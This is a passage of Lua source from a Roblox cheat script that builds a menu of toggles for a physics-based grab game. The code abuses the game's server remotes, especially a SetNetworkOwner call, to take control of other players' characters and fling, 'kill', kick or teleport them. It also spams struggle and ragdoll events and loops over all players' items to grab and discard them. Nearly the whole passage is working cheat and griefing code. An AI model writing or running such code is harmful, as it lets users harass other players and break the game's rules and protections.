        ForceSit()

        local RagdollLimbs = GetRagdollLimbs(Character)

        -- server struggle spam
        task.spawn(function()
            while AntiGrabEnabled and IsHeld.Value do
                pcall(function()
                    Remotes.Struggle:FireServer()
                    Remotes.RagdollRemote:FireServer(Root, 0)
                end)
                task.wait()
            end
        end)

        -- physics break loop
        task.spawn(function()
            while AntiGrabEnabled and IsHeld.Value do
                if Humanoid and Root then
                    pcall(function()
                        Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                        Root.Anchored = true
                        Root.AssemblyLinearVelocity = Vector3.zero
                        Root.AssemblyAngularVelocity = Vector3.zero
                    end)
                end
                task.wait()
            end
            if Root then
                Root.Anchored = false
            end
        end)

        -- ragdoll limb override
        task.spawn(function()
            while AntiGrabEnabled and Root and Root.Anchored do
                pcall(function()

                    if Head then
                        Head.CanCollide = false
                        Head.AssemblyLinearVelocity = Vector3.zero
                        Head.AssemblyAngularVelocity = Vector3.zero
                    end

                    for RagdollLimb, Socket in pairs(RagdollLimbs) do
                        if RagdollLimb and Socket and Root then
                            Socket.Enabled = false
                            RagdollLimb.CFrame = Root.CFrame
                            RagdollLimb.CanCollide = false
                            RagdollLimb.AssemblyLinearVelocity = Vector3.zero
                            RagdollLimb.AssemblyAngularVelocity = Vector3.zero
                        end
                    end

                end)
                task.wait()
            end
        end)
    end)
end

local function StopAntiGrab()
    AntiGrabEnabled = false

    if HeldConnection then
        HeldConnection:Disconnect()
        HeldConnection = nil
    end

    if SitThread then
        task.cancel(SitThread)
        SitThread = nil
    end

    if Root then
        Root.Anchored = false
    end

    if Humanoid then
        Humanoid.Sit = false
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true)
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    end
end

----------------------------------------------------
-- TOGGLE
----------------------------------------------------

AntiTab:CreateToggle({
    Name = "Anti Grab",
    CurrentValue = false,
    Callback = function(Value)
        AntiGrabEnabled = Value
        if Value then
            StartAntiGrab()
        else
            StopAntiGrab()
        end
    end
})


tpland = {
    Spawn = Vector3.new(0, - 7.35, 0),
    SpawnCave = Vector3.new(- 90, 14.6, - 314.3),
    GreenHouse = Vector3.new(- 538, - 7, 74),
    PinkHouse = Vector3.new(- 478, - 7, - 147),
    Barn = Vector3.new(- 228, 82, - 318),
    BlueHouse = Vector3.new(496, 83, - 350),
    ChineseHouse = Vector3.new(542, 123, - 93),
    PurpleHouse = Vector3.new(270, - 7, 448),
    Factory = Vector3.new(134, 347, 352),
    OtherGreenHouse = Vector3.new(- 359, 98, 357),
    BigCave = Vector3.new(- 245, 80, 485),
    GoodPrison = Vector3.new(569.6, - 7, 176.3),
    RuhubsDogAhhPrison = Vector3.new(564, 82.5, 210),
    ExtremelyGoodPrison = Vector3.new(525, 76, 56),
    TrainCave = Vector3.new(536.6, 87.5, - 169.5),
    IslanCave = Vector3.new(75.8, 323, 368.5),
    ChineseRoof = Vector3.new(592, 153, - 100),
    UfoCave = Vector3.new(29.6, 10.5, - 225.8),
    Prison = Vector3.new(195, - 7, - 561),
    BlueHouseSlot = Vector3.new(562.2, 85.38, - 212.56),
    SpawnSlot = Vector3.new(51.75, - 5.3, - 121.64),
    HauntedSlot = Vector3.new(164.57, - 5.43, 530.97),
    RandomSlot = Vector3.new(- 211.65, 85.7, 426.72),
    BeachSlot = Vector3.new(- 546.97, - 5.3, - 41.09)
}

SL = tpland["Spawn"]
antiok = true
lastSafePosition = nil
teleportDetected = false
lastCheckTime = tick()
positionHistory = {}
maxHistory = 10
isHeldSpamDetected = false
heldChangeTimes = {}
heldSpamThreshold = 8
lastHeldValue = false
struggling = false
lastStruggleTime = 0
struggleCooldown = 0.5

AS = AntiTab:CreateToggle({
    Name = "Anti setown kick",
    Default = true,
    Callback = function(Value)
        antiok = Value
        if Value then
            task.spawn(function()
                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    lastSafePosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                    for i = 1, maxHistory do
                        table.insert(positionHistory, lastSafePosition)
                    end
                end
                
                if game.Players.LocalPlayer:FindFirstChild("IsHeld") then
                    lastHeldValue = game.Players.LocalPlayer.IsHeld.Value
                end
                
                while antiok and task.wait(0.05) do
                    char = game.Players.LocalPlayer.Character
                    if not char then
                        continue
                    end
                    
                    hrp = char:FindFirstChild("HumanoidRootPart")
                    if not hrp then
                        continue
                    end
                    
                    currentPos = hrp.Position
                    currentTime = tick()
                    
                    isHeld = false
                    if game.Players.LocalPlayer:FindFirstChild("IsHeld") then
                        isHeld = game.Players.LocalPlayer.IsHeld.Value
                        
                        if isHeld ~= lastHeldValue then
                            table.insert(heldChangeTimes, currentTime)
                            lastHeldValue = isHeld
                            
                            for i = # heldChangeTimes, 1, - 1 do
                                if currentTime - heldChangeTimes[i] > 2 then
                                    table.remove(heldChangeTimes, i)
                                end
                            end
                            
                            if # heldChangeTimes >= heldSpamThreshold then
                                isHeldSpamDetected = true
                            end
                        end
                    end
                    
                    if isHeld and not struggling and (currentTime - lastStruggleTime > struggleCooldown) then
                        struggling = true
                        lastStruggleTime = currentTime
                        
                        task.spawn(function()
                            for i = 1, 5 do
                                pcall(function()
                                    game:GetService("ReplicatedStorage").CharacterEvents.Struggle:FireServer(game.Players.LocalPlayer)
                                end)
                                task.wait(0.05)
                            end
                            struggling = false
                        end)
                    end
                    
                    table.insert(positionHistory, 1, currentPos)
                    if # positionHistory > maxHistory then
                        table.remove(positionHistory, maxHistory + 1)
                    end
                    
                    avgDistance = 0
                    if # positionHistory >= 2 then
                        for i = 2, # positionHistory do
                            avgDistance = avgDistance + (positionHistory[i - 1] - positionHistory[i]).Magnitude
                        end
                        avgDistance = avgDistance / (# positionHistory - 1)
                    end
                    
                    velocity = hrp.AssemblyLinearVelocity.Magnitude
                    movedDistance = (currentPos - lastSafePosition).Magnitude
                    
                    abnormalTeleport = false
                    
                    if isHeldSpamDetected then
                        abnormalTeleport = true
                    
                    elseif currentPos.Magnitude > 1000000 then
                        abnormalTeleport = true
                        teleportDetected = true
                    
                    elseif movedDistance > 100 and velocity < 50 and avgDistance < 10 then
                        abnormalTeleport = true
                        teleportDetected = true
                    
                    elseif currentPos.Y > 10000 or currentPos.Y < - 1000 then
                        abnormalTeleport = true
                        teleportDetected = true
                    
                    elseif velocity > 500 then
                        abnormalTeleport = true
                        teleportDetected = true
                    end
                    
                    if abnormalTeleport then
                        isHeldSpamDetected = false
                        heldChangeTimes = {}
                        
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                        
                        for i = 1, 3 do
                            pcall(function()
                                game:GetService("ReplicatedStorage").CharacterEvents.Struggle:FireServer(game.Players.LocalPlayer)
                            end)
                            task.wait(0.05)
                        end
                        
                        teleported = false
                        
                        if SL ~= 'off' and SL then
                            hrp.CFrame = CFrame.new(SL)
                            teleported = true
                        else
                            plots = workspace:FindFirstChild("Plots")
                            foundSafe = false
                            
                            if plots then
                                for i = 1, 5 do
                                    plot = plots:FindFirstChild("Plot" .. i)
                                    if plot then
                                        sign = plot:FindFirstChild("PlotSign")
                                        ownersFolder = sign and sign:FindFirstChild("ThisPlotsOwners")
                                        valueObj = ownersFolder and ownersFolder:FindFirstChild("Value")
                                        if valueObj and valueObj.Value == game.Players.LocalPlayer.Name then
                                            grabPart = plot:FindFirstChild("PlusGrabPart", true)
                                            if grabPart then
                                                hrp.CFrame = grabPart.CFrame
                                                foundSafe = true
                                                teleported = true
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                            
                            if not foundSafe then
                                hrp.CFrame = CFrame.new(tpland["Spawn"])
                                teleported = true
                            end
                        end
                        
                        if teleported then
                            hrp.AssemblyLinearVelocity = Vector3.zero
                            hrp.AssemblyAngularVelocity = Vector3.zero
                            
                            if char:FindFirstChild("Humanoid") then
                                char.Humanoid.PlatformStand = false
                                char.Humanoid.Sit = false
                            end
                            
                            task.wait(0.2)
                            
                            teleportDetected = false
                            lastSafePosition = hrp.Position
                            positionHistory = {}
                            for i = 1, maxHistory do
                                table.insert(positionHistory, lastSafePosition)
                            end
                            
                            task.spawn(function()
                                for i = 1, 5 do
                                    pcall(function()
                                        game:GetService("ReplicatedStorage").CharacterEvents.Struggle:FireServer(game.Players.LocalPlayer)
                                    end)
                                    task.wait(0.1)
                                end
                            end)
                        end
                    else
                        if not teleportDetected and movedDistance < 50 then
                            lastSafePosition = currentPos
                        end
                    end
                    
                    lastCheckTime = currentTime
                end
            end)
        else
            antiok = false
            positionHistory = {}
            teleportDetected = false
            isHeldSpamDetected = false
            heldChangeTimes = {}
        end
    end    
})

AntiTab:CreateSection("Anti annoy")

players = game:GetService("Players")
runService = game:GetService("RunService")
localPlayer = game.Players.LocalPlayer
workspace = game:GetService("Workspace")

myToysFolder = workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")


function getCharacter(player)
    char = player.Character
    if not char then
        if player.CharacterAdded then
            char = player.CharacterAdded:Wait() or nil
        else
            char = nil
        end
    end
    return char
end

function getHumanoidRootPart(character)
    return character:FindFirstChild("HumanoidRootPart") or nil
end

function getHumanoid(character)
    return character:FindFirstChild("Humanoid") or nil
end

function getDistance(part1, part2)
    return (part1.Position - part2.Position).Magnitude
end

function getAllToys(includePlots)
    allToys = {}
    playersList = players:GetPlayers()
    
    for _, player in ipairs(playersList) do
        toyFolder = workspace[player.Name .. "SpawnedInToys"]
        for _, toy in pairs(toyFolder:GetChildren()) do
            if toy:IsA("Model") then
                table.insert(allToys, toy)
            end
        end
    end
    
    if includePlots then
        for i = 1, 5 do
            for _, item in pairs(workspace.PlotItems["Plot" .. i]:GetChildren()) do
                if item:IsA("Model") then
                    table.insert(allToys, item)
                end
            end
        end
    end
    
    return allToys
end

function spawnToy(toyName, cframe)
    if localPlayer.CanSpawnToy then
        task.spawn(function()
            toySpawn = replicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
            toySpawn:InvokeServer(toyName, cframe * CFrame.new(0, 10, 20), Vector3.new(0, 0, 0))
            repeat
                task.wait()
            until myToysFolder:FindFirstChild(toyName)
            task.wait(0.01)
            return myToysFolder:FindFirstChild(toyName)
        end)
    end
end

function destroyToy(toy)
    task.spawn(function()
        success, err = pcall(function()
            toyDestroy = replicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
            toyDestroy:FireServer(toy)
        end)
        if not success then
            warn("Error: " .. err)
        end
    end)
end

function setNetworkOwner(part, cframe)
    task.spawn(function()
        setNetworkOwnerRemote = replicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
        setNetworkOwnerRemote:FireServer(part, cframe)
    end)
end

function toggleConstraint(constraint, enabled)
    if constraint then
        if constraint.Name ~= "LeftWeld" then
            if constraint.Name ~= "LeftAlignOrientation" then
                if constraint.Name ~= "RightWeld" then
                    if constraint.Name == "RightAlignOrientation" and (constraint and constraint.Parent.Parent.Parent ~= myToysFolder) then
                        constraint.Enabled = enabled
                    end
                elseif constraint and constraint.Parent.Parent.Parent ~= myToysFolder then
                    constraint.Enabled = enabled
                end
            elseif constraint and constraint.Parent.Parent.Parent ~= myToysFolder then
                constraint.Enabled = enabled
            end
        elseif constraint and constraint.Parent.Parent.Parent ~= myToysFolder then
            constraint.Enabled = enabled
        end
    end
end

function ragdollFall()
    rootPart = getHumanoidRootPart(getCharacter(localPlayer))
    if rootPart then
        ragdollRemote = replicatedStorage:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote")
        ragdollRemote:FireServer(rootPart, 1)
    end
end

function antiBananaDeleteLegs()
    if getCharacter(localPlayer) ~= nil then
        task.spawn(function()
            ragdollFall()
        end)
        task.wait(0.1)
        character = getCharacter(localPlayer)
        rightLeg = character:FindFirstChild("Right Leg")
        leftLeg = character:FindFirstChild("Left Leg")
        clonedLeg = rightLeg:Clone()
        clonedLeg.Parent = character
        clonedLeg.BallSocketConstraint:Destroy()
        task.wait(0.1)
        rightLeg.CFrame = CFrame.new(0, - 59999, 0)
        leftLeg.CFrame = CFrame.new(0, - 59999, 0)
        task.wait()
        cup = spawnToy("CupMugBrown", getHumanoidRootPart(getCharacter(localPlayer)).CFrame)
        cup = myToysFolder:WaitForChild("CupMugBrown")
        setNetworkOwner(getHumanoidRootPart(character), CFrame.new(cup.Hitbox.Position))
        task.wait()
        destroyToy(cup)
        clonedLeg.CFrame = CFrame.new(0, 9999999, 0)
        clonedLeg.Massless = true
    end
end

AntiTab:CreateButton({
    Name = "Anti banana - delete legs",
    Callback = function()
        antiBananaDeleteLegs()
    end
})

me = game:GetService("Players").LocalPlayer
ReplicatedStorage = game:GetService("ReplicatedStorage")

RagdollRemote = ReplicatedStorage:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote")

AntiRagBlob = false
RagdolledSit = false

Cons = {}

function FWC(parent, childName)
    return parent:FindFirstChild(childName)
end

function Disc(connectionName)
    if Cons[connectionName] then
        Cons[connectionName]:Disconnect()
        Cons[connectionName] = nil
    end
end

Toggle = AntiTab:CreateToggle({
    Name = "Anti snowball",
    CurrentValue = false,
    Flag = "AntiRagdoll",
    Callback = function(Value)
        AntiRagBlob = Value
        RagdolledSit = false
        
        if AntiRagBlob then
            char = me.Character or me.CharacterAdded:Wait()
            hum = char and FWC(char, "Humanoid")
            HRP = char and FWC(char, "HumanoidRootPart")
            
            Cons["ARSeat"] = hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                if hum.SeatPart and hum.SeatPart.Parent.Name == "CreatureBlobman" and not RagdolledSit then
                    RagdolledSit = true
                    Seat = hum.SeatPart
                    
                    while not hum.Sit do 
                        task.wait() 
                    end
                    
                    RagdollRemote:FireServer(HRP, 3)
                    
                    while not hum.Ragdolled.Value and not hum.Sit do 
                        task.wait() 
                    end
                    
                    task.wait(0.4)
                    hum.Sit = false
                    Seat:Sit(hum)
                    
                    task.delay(0.25, function()
                        while hum and hum.SeatPart do
                            RagdollRemote:FireServer(me.Character.HumanoidRootPart, 1)
                            task.wait(0.05)
                        end
                        RagdolledSit = false
                    end)
                end
            end)
            
            Cons["ARChar"] = me.CharacterAdded:Connect(function(char)
                hum = char:WaitForChild("Humanoid")
                HRP = char:WaitForChild("HumanoidRootPart")
                
                Cons["ARSeat"] = hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                    if hum.SeatPart and hum.SeatPart.Parent.Name == "CreatureBlobman" and not RagdolledSit then
                        RagdolledSit = true
                        Seat = hum.SeatPart
                        
                        while not hum.Sit do 
                            task.wait() 
                        end
                        
                        RagdollRemote:FireServer(HRP, 3)
                        
                        while not hum.Ragdolled.Value and not hum.Sit do 
                            task.wait() 
                        end
                        
                        task.wait(0.4)
                        hum.Sit = false
                        Seat:Sit(hum)
                        
                        task.delay(0.25, function()
                            while hum and hum.SeatPart do
                                RagdollRemote:FireServer(me.Character.HumanoidRootPart, 1)
                                task.wait(0.05)
                            end
                            RagdolledSit = false
                        end)
                    end
                end)
            end)
        else
            Disc("ARSeat")
            Disc("ARChar")
        end
    end,
})

GrabData = {
    toggle = false,
    lp = game.Players.LocalPlayer,
    ws = workspace,
    dropPos = CFrame.new(- 238.98, - 256.01, - 123.97)
}
function GrabItem(item)
    local hold = item:FindFirstChild("HoldPart")
    if not hold then
        return
    end
    
    local grab = hold:FindFirstChild("HoldItemRemoteFunction")
    local drop = hold:FindFirstChild("DropItemRemoteFunction")
    
    if grab and drop then
        pcall(function()
            grab:InvokeServer(item, GrabData.lp.Character)
        end)
        pcall(function()
            drop:InvokeServer(item, GrabData.dropPos, Vector3.new())
        end)
    end
end
function GrabFolder(folder)
    for _, obj in ipairs(folder:GetDescendants()) do
        if obj:IsA("Model") and obj:FindFirstChild("HoldPart") then
            local holdPart = obj.HoldPart
            if holdPart:FindFirstChild("HoldItemRemoteFunction") then
                GrabItem(obj)
            end
        end
    end
end

function LoopGrab()
    while GrabData.toggle do
        for _, folder in ipairs(GrabData.ws:GetChildren()) do
            if folder:IsA("Folder") and folder.Name:find("SpawnedInToys") then
                GrabFolder(folder)
            end
        end
        
        local plotItems = GrabData.ws:FindFirstChild("PlotItems")
        if plotItems then
            for _, plot in pairs(plotItems:GetChildren()) do
                if plot.Name ~= "PlayersInPlots" then
                    for _, model in pairs(plot:GetChildren()) do
                        if model:IsA("Model") and model:FindFirstChild("HoldPart") then
                            local holdPart = model.HoldPart
                            if holdPart:FindFirstChild("HoldItemRemoteFunction") then
                                GrabItem(model)
                            end
                        end
                    end
                end
            end
        end
        
        task.wait(0.001)
    end
end

AntiTab:CreateToggle({
    Name = "Delete holdables",
    Default = false,
    Callback = function(state)
        GrabData.toggle = state
        if state then
            task.spawn(LoopGrab)
        end
    end
})

holdItemLoop = nil

AntiTab:CreateSection("Holdparts (food and instruments)")

AntiTab:CreateToggle({
    Name = "Grab holdables",
    CurrentValue = false,
    Flag = "HoldItemToggle",
    Callback = function(enabled)
        if enabled then
            if not holdItemLoop then
                holdItemLoop = coroutine.create(function()
                    while true do
                        for _, item in pairs(workspace:GetDescendants()) do
                            if item:IsA("Model") and item:FindFirstChild("HoldPart") then
                                local holdArgs = { item, workspace:WaitForChild(game.Players.LocalPlayer.Name, 9e9) }

                                local holdFunction = item.HoldPart:FindFirstChild("HoldItemRemoteFunction")
                                if holdFunction then
                                    holdFunction:InvokeServer(unpack(holdArgs))
                                end
                            end
                        end
                        task.wait(0.01)
                    end
                end)
                coroutine.resume(holdItemLoop)
            end
        else
            if holdItemLoop then
                coroutine.close(holdItemLoop)
                holdItemLoop = nil
            end
        end
    end,
})



AntiTab:CreateButton({
    Name = "Use holdables",
    Callback = function()
        for _, item in pairs(workspace:GetDescendants()) do
            if item:IsA("Model") and item:FindFirstChild("HoldPart") then
                local useArgs = { item }
                local useFunction = game:GetService("ReplicatedStorage"):WaitForChild("HoldEvents", 9e9):WaitForChild("Use", 9e9)
                
                if useFunction then
                    useFunction:FireServer(unpack(useArgs))
                end
            end
        end
    end,
})

AntiTab:CreateButton({
    Name = "Drop Holdables",
    Callback = function()
        local Char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
        local HRP = Char:WaitForChild("HumanoidRootPart")

        for _, item in pairs(workspace:GetDescendants()) do
            if item:IsA("Model") and item:FindFirstChild("HoldPart") then
                local dropFunction = item.HoldPart:FindFirstChild("DropItemRemoteFunction")
                if dropFunction then
                    local dropPosition = HRP.CFrame
                    local dropArgs = {
                        item,
                        dropPosition,
                        Vector3.new(0, 0, 0)
                    }
                    dropFunction:InvokeServer(unpack(dropArgs))
                end
            end
        end
    end,
})

AntiTab:CreateSection("Auto Attacker")

Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
RunService = game:GetService("RunService")
Debris = game:GetService("Debris")
LocalPlayer = Players.LocalPlayer
defenseEnabled = false
defenseConnection = nil
defenseMode = "Fling"

GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
DestroyGrabLine = GrabEvents:FindFirstChild("DestroyGrabLine")
CreateGrabEvent = GrabEvents:FindFirstChild("CreateGrabLine")

function getAttacker()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("Head") then
        return
    end
    local owner = char.Head:FindFirstChild("PartOwner")
    if not owner or not owner:IsA("StringValue") then
        return
    end
    return Players:FindFirstChild(owner.Value)
end

function performFling(attacker)
    if not attacker or not attacker.Character then
        return
    end
    local root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        SetNetworkOwner:FireServer(root, root.CFrame)
        if DestroyGrabLine then
            DestroyGrabLine:FireServer(root)
        end
        local away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
        away = Vector3.new(away.X, 0, away.Z) * 90000
        local bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganFling"
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = away
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end
function performKill(attacker)
    if not attacker or not attacker.Character then
        return
    end
    local root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        SetNetworkOwner:FireServer(root, root.CFrame)
        if DestroyGrabLine then
            DestroyGrabLine:FireServer(root)
        end
        local away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
        away = Vector3.new(away.X, 0, away.Z) * 99999999999999
        local bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganFling"
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = away
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end

function performHeaven(attacker)
    if not attacker or not attacker.Character then
        return
    end
    local root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        SetNetworkOwner:FireServer(root, root.CFrame)
        if DestroyGrabLine then
            DestroyGrabLine:FireServer(root)
        end
        root.CFrame = CFrame.new(0, 200, 0)
        local bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganHeaven"
        bv.MaxForce = Vector3.new(0, math.huge, 0)
        bv.Velocity = Vector3.new(0, 200, 0)
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end

function performKick(attacker)
    if not attacker or not attacker.Character then
        return
    end
    local root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        SetNetworkOwner:FireServer(root, root.CFrame)
        if DestroyGrabLine then
            DestroyGrabLine:FireServer(root)
        end
        root.CFrame = CFrame.new(0, 999999999999, 0)
        local bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganHeaven"
        bv.MaxForce = Vector3.new(0, math.huge, 0)
        bv.Velocity = Vector3.new(0, 99999999999999, 0)
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end
function performRagdoll(attacker)
    if not attacker or not attacker.Character then
        return
    end
    local root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        SetNetworkOwner:FireServer(root, root.CFrame)
        if DestroyGrabLine then
            DestroyGrabLine:FireServer(root)
        end
        local bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganSpy"
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = Vector3.new(0, - 20, 0)
        bv.P = 12500
        bv.Parent = root
        Debris:AddItem(bv, 0.01)
    end)
end
function performHell(attacker)
    if not attacker or not attacker.Character then
        return
    end
    local root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        SetNetworkOwner:FireServer(root, root.CFrame)
        if DestroyGrabLine then
            DestroyGrabLine:FireServer(root)
        end
        for _, part in ipairs(attacker.Character:GetDescendants()) do
            if part:IsA("BasePart") and not part.Anchored then
                part.CanCollide = false
            end
        end
        local bv = Instance.new("BodyVelocity")
        bv.Name = "RinneganSpy"
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = Vector3.new(0, - 100000000, 0)
        bv.P = 12500
        bv.Parent = root
        local noclipConnection
        noclipConnection = RunService.Heartbeat:Connect(function()
            if not attacker.Character or not attacker.Character.Parent then
                noclipConnection:Disconnect()
                return
            end
            for _, part in ipairs(attacker.Character:GetDescendants()) do
                if part:IsA("BasePart") and not part.Anchored then
                    part.CanCollide = false
                end
            end
        end)
        task.delay(0.01, function()
            if noclipConnection then
                noclipConnection:Disconnect()
            end
        end)
        Debris:AddItem(bv, 0.01)
    end)
end
function performChina(attacker)
    if not attacker or not attacker.Character then
        return
    end
    local root = attacker.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    pcall(function()
        SetNetworkOwner:FireServer(root, root.CFrame)
        if DestroyGrabLine then
            DestroyGrabLine:FireServer(root)
        end
        root.CFrame = CFrame.new(591, 153, - 101)
    end)
end
crazyline = false
function performSpamGrabLines(attacker)
    while crazyline do
        local char = LocalPlayer.Character
        if char then
            local head = char:FindFirstChild("Head")
            if head then
                local owner = head:FindFirstChild("PartOwner")
                if owner and owner:IsA("StringValue") then
                    local attacker = Players:FindFirstChild(owner.Value)
                    if attacker and attacker.Character then
                        local attackerHead = attacker.Character:FindFirstChild("Head")
                        local attackerHRP = attacker.Character:FindFirstChild("HumanoidRootPart")
                        if attackerHead and attackerHRP then
                            for i = 1, 10 do
                                pcall(function()
                                    CreateGrabEvent:FireServer(attackerHead, attackerHead.CFrame)
                                end)
                            end
                            for i = 1, 10 do
                                pcall(function()
                                    CreateGrabEvent:FireServer(attackerHRP, attackerHRP.CFrame)
                                end)
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.01)
    end
end
function startDefense()
    if defenseConnection then
        return
    end
    defenseConnection = RunService.Heartbeat:Connect(function()
        if not defenseEnabled then
            return
        end
        local attacker = getAttacker()
        if not attacker then
            return
        end
        if defenseMode == "Fling" then
            performFling(attacker)
        elseif defenseMode == "Kill" then
            performKill(attacker)
        elseif defenseMode == "Send to Heaven" then
            performHeaven(attacker)
        elseif defenseMode == "Kick" then
            performKick(attacker)
        elseif defenseMode == "Ragdoll" then
            performRagdoll(attacker)
        elseif defenseMode == "Hell" then
            performHell(attacker)
        elseif defenseMode == "China" then
            performChina(attacker)
        elseif defenseMode == "GrabLine" then
            performSpamGrabLines(attacker)
        end
    end)
end
function stopDefense()
    if defenseConnection then
        defenseConnection:Disconnect()
        defenseConnection = nil
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        local char = plr.Character
        if char then
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("BodyVelocity") and (obj.Name == "RinneganFling" or obj.Name == "RinneganHeaven") then
                    obj:Destroy()
                end
            end
        end
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    if defenseEnabled then
        task.wait(1)
        startDefense()
    end
end)


AntiTab:CreateToggle({
    Name = 'Auto-Attack',
    CurrentValue = false,
    Flag = "RinneganDefenseToggle",
    Callback = function(enabled)
        defenseEnabled = enabled
        if enabled then
            startDefense()
        else
            stopDefense()
        end
    end
})

AntiTab:CreateDropdown({
    Name = "Mode",
    Options = {
        "Fling",
        "Kill",
        "Send to Heaven",
        "Kick",
        "Ragdoll",
        "Hell",
        "China",
        "GrabLine"
    },
    CurrentOption = "Fling",
    Flag = "RinneganMode",
    Callback = function(mode)
        if typeof(mode) == "table" then
            mode = mode[1]
        end
        defenseMode = mode
    end
})



Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
Workspace = game:GetService("Workspace")
RunService = game:GetService("RunService")
LocalPlayer = Players.LocalPlayer

GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
RemoteSetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
RemoteDestroyGrabLine = GrabEvents:WaitForChild("DestroyGrabLine")
SpawnToyRF = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")

SelectedPlayer = nil
KillHB, KickHB, GrabKickHB = nil, nil, nil
LoopKickOn, LoopKillOn, LoopBlobKickOn, LoopBlobKillOn, LoopGrabKickOn = false, false, false, false, false
spamActive = false

HEIGHT_LIMIT = 100000
TELEPORT_OFFSET = Vector3.new(6, - 18.5, 0)

function sno(part)
    if not part or not part.Parent then
        return
    end
    pcall(function()
        RemoteSetNetworkOwner:FireServer(part, part.CFrame)
    end)
end

function DisableCollisions(model)
    for _, d in ipairs(model:GetDescendants()) do
        if d:IsA("BasePart") then
            d.CanCollide = false
        end
    end
end

function setNoCollideChar(char)
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = false
        end
    end
end

function isTooHigh(plr)
    local c = plr.Character
    local hrp = c and c:FindFirstChild("HumanoidRootPart")
    return not hrp or hrp.Position.Y > HEIGHT_LIMIT
end

function findBlobman()
    local toys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    return toys and toys:FindFirstChild("CreatureBlobman") or nil
end

function spawnBlobman()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then
        return
    end
    SpawnToyRF:InvokeServer("CreatureBlobman", char.HumanoidRootPart.CFrame * CFrame.new(0, 0, - 5), Vector3.new(0, - 15, 0))
end

function ensureBlobman()
    local b = findBlobman()
    if b then
        return b
    end
    spawnBlobman()
    for _ = 1, 11 do
        task.wait(1)
        b = findBlobman()
        if b then
            return b
        end
    end
    return nil
end

CameraAnchor = {}
CameraAnchor.__index = CameraAnchor
function CameraAnchor.new()
    return setmetatable({}, CameraAnchor)
end
function CameraAnchor:attach(cf)
    self:detach()
    local p = Instance.new("Part")
    p.Name, p.Size, p.Transparency, p.Anchored, p.CanCollide, p.CFrame, p.Parent = "CameraAnchor", Vector3.new(0.2, 0.2, 0.2), 1, true, false, cf, Workspace
    self.part = p
    local cam = Workspace.CurrentCamera
    cam.CameraType = Enum.CameraType.Custom
    cam.CameraSubject = p
end
function CameraAnchor:detach()
    if self.part then
        self.part:Destroy()
        self.part = nil
    end
    local cam = Workspace.CurrentCamera
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") then
        cam.CameraSubject = char.Humanoid
    else
        cam.CameraType = Enum.CameraType.Custom
        cam.CameraSubject = cam
    end
end
local cameraAnchor = CameraAnchor.new()

function saveOriginalPosAttr()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
